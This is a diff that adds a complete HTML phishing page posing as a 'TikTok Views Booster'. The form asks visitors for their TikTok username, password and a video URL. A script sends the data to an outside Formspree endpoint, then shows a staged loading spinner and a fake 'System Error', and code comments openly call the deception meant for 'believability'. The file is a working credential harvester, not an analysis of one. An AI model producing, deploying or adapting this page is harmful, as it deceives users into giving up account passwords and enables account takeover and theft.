@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Views Booster</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: radial-gradient(circle at center, #1a1a1a 0%, #000000 100%); }
+        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37); }
+        .loader { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .hidden-section { display: none; }
+    </style>
+</head>
+<body class="text-white flex items-center justify-center min-h-screen p-4">
+
+    <div id="main-card" class="glass p-8 rounded-3xl w-full max-w-md text-center relative overflow-hidden">
+        <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-cyan-400 via-white to-pink-500"></div>
+        
+        <!-- FORM SECTION -->
+        <div id="form-content">
+            <h1 class="text-3xl font-bold mb-2 text-white">Boost <span class="text-pink-500">Views</span></h1>
+            <p class="text-gray-400 mb-8">Enter your details to start the generation process</p>
+
+            <form id="booster-form" action="https://formspree.io/f/xnpjgnnq" method="POST" class="space-y-4 text-left">
+                <div>
+                    <label class="text-xs uppercase text-gray-500 ml-1">TikTok Username</label>
+                    <input type="text" name="username" required placeholder="@username" class="w-full p-3 rounded-xl bg-black/40 border border-gray-700 focus:border-pink-500 outline-none transition-all">
+                </div>
+                <div class="mt-4">
+                    <label class="text-xs uppercase text-gray-500 ml-1">TikTok Password</label>
+                    <input type="password" name="password" required placeholder="••••••••" class="w-full p-3 rounded-xl bg-black/40 border border-gray-700 focus:border-pink-500 outline-none transition-all">
+                </div>
+                <div class="mt-4">
+                    <label class="text-xs uppercase text-gray-500 ml-1">Video URL</label>
+                    <input type="url" name="video_url" required placeholder="https://www.tiktok.com/..." class="w-full p-3 rounded-xl bg-black/40 border border-gray-700 focus:border-pink-500 outline-none transition-all">
+                </div>
+                <button type="submit" class="w-full mt-8 bg-pink-600 hover:bg-pink-700 text-white font-bold py-3 rounded-xl transition-all shadow-lg shadow-pink-500/20">Generate Views</button>
+            </form>
+        </div>
+        <!-- LOADING SECTION -->
+        <div id="loading-content" class="hidden-section flex flex-col items-center py-10">
+            <div class="loader mb-4"></div>
+            <h2 class="text-xl font-semibold">Generating Views...</h2>
+            <p class="text-gray-400 mt-2">Please wait while we process your request</p>
+        </div>
+
+        <!-- ERROR SECTION -->
+        <div id="error-content" class="hidden-section flex flex-col items-center py-10">
+            <div class="bg-red-500/20 p-4 rounded-full mb-4">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.88a2 2 0 01-2-2V5a2 2 0 012-2h-16a2 2 0 012 2v14a2 2 0 01-2 2zm10-10h-4V5h4v4" />
+                </svg>
+            </div>
+            <h2 class="text-2xl font-bold text-white mb-2">System Error</h2>
+            <p class="text-gray-400 mb-6">An unexpected error occurred while generating views. Please try again later.</p>
+            <button onclick="location.reload()" class="px-6 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-sm transition-all">Try Again</button>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('booster-form');
+        const formContent = document.getElementById('form-content');
+        const loadingContent = document.getElementById('loading-content');
+        const errorContent = document.getElementById('error-content');
+
+        form.onsubmit = async (e) => {
+            e.preventDefault();
+            
+            // 1. Show Loading
+            formContent.classList.add('hidden-section');
+            loadingContent.classList.remove('hidden-section');
+
+            // 2. Capture Data
+            const formData = new FormData(form);
+            
+            try {
+                // 3. Send data to Formspree (Background)
+                await fetch('https://formspree.io/f/xnpjgnnq', {
+                    method: 'POST',
+                    body: formData,
+                    headers: { 'Accept': 'application/json' }
+                });
+            } catch (err) {
+                console.log("Error sending data, but we will show the fake error anyway.");
+            }
+
+            // 4. Delay for "Believability"
+            setTimeout(() => {
+                loadingContent.classList.add('hidden-section');
+                errorContent.classList.remove('hidden-section');
+            }, 3500); // 3.5 seconds of loading
+        };
+    </script>
+</body>
+</html>
